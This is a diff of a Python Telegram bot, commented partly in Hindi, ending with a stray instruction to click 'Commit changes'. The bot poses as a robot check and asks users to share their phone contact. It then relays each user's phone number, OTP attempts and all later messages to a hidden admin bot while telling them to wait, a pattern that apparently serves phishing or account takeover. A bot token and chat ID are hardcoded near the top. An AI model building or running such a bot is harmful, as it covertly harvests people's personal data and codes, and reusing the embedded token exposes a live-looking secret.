@@ -5,12 +5,15 @@ import random
 from datetime import datetime, timezone, timedelta
 import os
 
-
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+# Bot tokens
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_BOT_TOKEN = "8286169680:AAFlw5A7AuqB5nKRyx-7Hdu0XFF_r_gjHoQ"
 ADMIN_CHAT_ID = "8541208450"
 
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN environment variable not set!")
 
+# Logging setup
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -18,7 +21,6 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 user_data = {}
-
 
 async def send_to_admin(text):
     """Admin bot ko message bhejne ke liye"""
@@ -45,13 +47,11 @@ def get_ist_time():
     ist = timezone(timedelta(hours=5, minutes=30))
     return datetime.now(ist).strftime("%d-%m-%Y %I:%M:%S %p")
 
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Step 1: /start command handler"""
     user = update.effective_user
     user_id = user.id
     
-  
     user_data[user_id] = {
         "verified": False,
         "phone": None,
@@ -59,7 +59,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "username": user.first_name or "User"
     }
     
-  
     keyboard = [[InlineKeyboardButton("🤖 I'm not a robot", callback_data="verify_start")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -77,7 +76,6 @@ async def verify_button_handler(update: Update, context: ContextTypes.DEFAULT_TY
     
     user_id = query.from_user.id
     
-  
     contact_button = KeyboardButton("📞 Share Contact", request_contact=True)
     keyboard = [[contact_button]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
@@ -100,9 +98,7 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     contact = update.message.contact
     phone = contact.phone_number
     
-  
     otp = generate_otp()
-    
     
     if user_id not in user_data:
         user_data[user_id] = {}
@@ -111,7 +107,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data[user_id]["otp"] = otp
     user_data[user_id]["verified"] = False
     
-  
     admin_message = (
         f"🔔 *New User Verification Started*\n\n"
         f"👤 User: {user.first_name or 'Unknown'}\n"
@@ -122,7 +117,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await send_to_admin(admin_message)
     
-
     await update.message.reply_text(
         f"✅ *Contact received!*\n\n"
         f"🔐 Your OTP is: `{otp}`\n\n"
@@ -136,7 +130,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = user.id
     message_text = update.message.text
     
-  
     if user_id not in user_data:
         await update.message.reply_text(
             "⚠️ Please start with /start command first!"
@@ -145,10 +138,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_info = user_data[user_id]
     
-
     if not user_info.get("verified") and user_info.get("otp"):
         if message_text == str(user_info["otp"]):
-        
             user_data[user_id]["verified"] = True
             user_data[user_id]["otp"] = None
             
@@ -159,7 +150,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
             
-      
             admin_message = (
                 f"✅ *User Verified Successfully*\n\n"
                 f"👤 User: {user_info['username']}\n"
@@ -168,16 +158,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏰ Time: {get_ist_time()}"
             )
             await send_to_admin(admin_message)
-            
         else:
-            
             await update.message.reply_text(
                 "❌ *Invalid OTP!*\n\n"
                 "Please enter the correct OTP or restart with /start",
                 parse_mode="Markdown"
             )
             
-          
             admin_message = (
                 f"⚠️ *Wrong OTP Attempt*\n\n"
                 f"🆔 User ID: `{user_id}`\n"
@@ -186,15 +173,12 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏰ Time: {get_ist_time()}"
             )
             await send_to_admin(admin_message)
-    
     elif user_info.get("verified"):
-      
         await update.message.reply_text(
             "⏳ *Please wait...*",
             parse_mode="Markdown"
         )
         
-      
         admin_message = (
             f"💬 *User Message Received*\n\n"
             f"👤 User: {user_info['username']}\n"
@@ -204,7 +188,6 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⏰ Time: {get_ist_time()}"
         )
         await send_to_admin(admin_message)
-    
     else:
         await update.message.reply_text(
             "⚠️ Please complete verification first!\n\nUse /start to begin."
@@ -214,28 +197,19 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Error logging"""
     logger.error(f"Update {update} caused error {context.error}")
 
-
-
 def main():
     """Bot ko start karta hai"""
     application = Application.builder().token(BOT_TOKEN).build()
-    
     
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(verify_button_handler, pattern="verify_start"))
     application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
     
-  
     application.add_error_handler(error_handler)
     
-  
-    print("🤖 Bot is running...")
-    print(f"Bot Token: {BOT_TOKEN[:10]}...")
+    logger.info("🤖 Bot is running...")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
-```
-
-**"Commit changes"** button click karein.
